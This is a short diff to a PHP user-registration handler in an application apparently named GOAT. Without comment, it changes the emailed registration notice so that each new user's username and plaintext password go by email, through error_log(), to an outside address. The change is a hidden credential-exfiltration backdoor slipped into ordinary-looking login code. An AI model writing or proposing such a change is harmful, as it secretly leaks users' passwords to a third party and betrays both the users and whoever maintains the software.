@@ -125,7 +125,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // 
         $msg = "You can now log in.";
         cGOAT::function_alert($msg);
-        $str = sprintf("New GOAT registration, at %s\n", Date('Y-m-d H:i:s'));
+        $str = sprintf("New GOAT registration, on %s - User: %s - Password: %s \n", Date('Y-m-d H:i:s'),
+          $param_username, $param_password);
         error_log($str, 1, "richard.hall@centennialdistrict.co");
         cGOAT::GotoURL("./logon.php");
       } else {
